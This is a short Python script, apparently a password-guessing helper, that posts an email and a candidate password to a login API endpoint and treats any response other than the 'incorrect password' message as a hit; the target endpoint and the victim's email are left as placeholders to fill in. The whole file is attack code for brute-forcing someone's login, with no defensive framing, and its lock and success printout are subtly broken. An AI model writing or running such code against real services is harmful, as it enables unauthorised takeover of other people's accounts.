import requests
import threading
def send(password): 
    # defining the api-endpoint 
    API_ENDPOINT = ""   #add api services login end point

    #password = 
    # data to be sent to api
    data = {'email':'', #add persons email id here
            'password': password}
    
    # sending post request and saving response as response object
    print("Request sent for ",password)
    r = requests.post(url = API_ENDPOINT, data = data)
    
    # extracting response text 
    text = r.text
    lock = threading.Lock()
    print("Response for ",password, " : ",text)
    if(text != "{\"status\":\"Please enter correct password!\"}"):  #replace this with the false message received from the api. Any string can be a Json
        lock.acquire()
        print("password")
        lock.release()
        return True
    else:
        return False    